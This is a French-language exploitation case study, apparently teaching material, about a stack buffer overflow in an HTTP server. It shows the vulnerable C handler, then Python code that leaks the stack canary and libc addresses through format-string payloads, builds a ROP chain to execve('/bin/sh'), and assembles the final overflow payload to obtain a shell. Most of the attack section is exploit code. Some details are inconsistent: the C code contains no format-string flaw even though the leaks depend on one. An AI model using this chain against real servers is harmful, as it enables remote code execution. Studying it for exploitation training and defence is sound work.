# Étude de Cas 1 : Exploitation Complète avec Bypass des Protections

## 📋 Scénario

Exploitation d'un buffer overflow dans un serveur HTTP avec :
- ✅ ASLR activé
- ✅ DEP/NX activé
- ✅ Stack Canary activé

## 🎯 Objectif

Obtenir l'exécution de code (RCE) malgré toutes les protections activées.

## 🔍 Analyse Initiale

### Vulnérabilité

```c
void handle_request(int client_fd) {
    char buffer[512];
    char response[1024];
    
    // Vulnérabilité : pas de vérification de taille
    read(client_fd, buffer, 4096);  // Overflow si > 512 bytes
    
    sprintf(response, "Received: %s\n", buffer);
    write(client_fd, response, strlen(response));
}
```

### Protections Actives

```bash
# Vérification
$ checksec --file server
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled  # ASLR pour le binaire
```

## 🛠️ Plan d'Exploitation

### Phase 1 : Information Leakage

**Objectif** : Fuiter le canary et les adresses libc

**Technique** : Format string via le buffer

```python
# Payload pour leak
leak_payload = b"%p" * 20  # Leak 20 adresses de la stack
# Réponse contient les adresses leakées
```

**Résultat** :
- Canary leaké : `0x7f3a2b1c00000000`
- Adresse `printf` leakée : `0x7ffff7a62800`
- Calcul libc_base : `leaked_printf - offset_printf_in_libc`

### Phase 2 : Construction ROP Chain

**Objectif** : Construire une chaîne ROP pour execve("/bin/sh")

**Gadgets nécessaires** :
```python
pop_rdi = libc_base + 0x23b6a  # pop rdi; ret
pop_rsi = libc_base + 0x2601f  # pop rsi; ret
pop_rdx = libc_base + 0x142c92 # pop rdx; ret
pop_rax = libc_base + 0x4a550  # pop rax; ret
syscall = libc_base + 0x2584d  # syscall; ret
```

**Chaîne ROP** :
```python
rop_chain = [
    pop_rdi,
    binsh_addr,  # "/bin/sh" string dans libc
    pop_rsi,
    0,  # argv = NULL
    pop_rdx,
    0,  # envp = NULL
    pop_rax,
    59,  # syscall execve
    syscall,
]
```

### Phase 3 : Exploitation Finale

**Payload complet** :
```python
payload = b"A" * 512        # Remplir le buffer
payload += leaked_canary   # Préserver le canary
payload += b"B" * 8        # Saved RBP
payload += rop_chain       # Return address → ROP chain
```

## 📊 Timeline d'Exploitation

```
T+0s  : Envoi payload leak
T+1s  : Réception des adresses leakées
T+2s  : Calcul des offsets libc
T+3s  : Construction de la chaîne ROP
T+4s  : Envoi payload d'exploitation
T+5s  : Shell obtenu
```

## 🔍 Analyse Détaillée

### Étape 1 : Leak du Canary

```python
# Format string pour leak
leak = b"%11$p"  # 11ème argument = canary
response = send_request(leak)
canary = int(response.split()[1], 16)
```

### Étape 2 : Leak de libc

```python
# Format string pour leak printf
leak = b"%15$p"  # 15ème argument = adresse printf
response = send_request(leak)
printf_addr = int(response.split()[1], 16)

# Calculer libc_base
libc_base = printf_addr - libc.symbols['printf']
```

### Étape 3 : Construction ROP

```python
# Trouver "/bin/sh" dans libc
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))

# Construire la chaîne
rop = ROP(libc)
rop.execve(binsh_addr, 0, 0)
rop_chain = rop.chain()
```

### Étape 4 : Exploitation

```python
# Payload final
payload = flat([
    b"A" * 512,
    canary,
    b"B" * 8,
    rop_chain,
])
```

## ✅ Résultat

- ✅ Canary bypassé (leak + préservation)
- ✅ ASLR bypassé (leak libc)
- ✅ DEP/NX bypassé (ROP au lieu de shellcode)
- ✅ Shell obtenu

## 📚 Leçons Apprises

1. **Infoleak est crucial** : Nécessaire pour bypasser ASLR et Canary
2. **Format string puissant** : Permet de leak plusieurs adresses
3. **ROP complexe mais efficace** : Contourne DEP complètement
4. **Défense en profondeur** : Nécessite plusieurs techniques combinées

---

**Note** : Cette étude de cas est théorique et pédagogique.

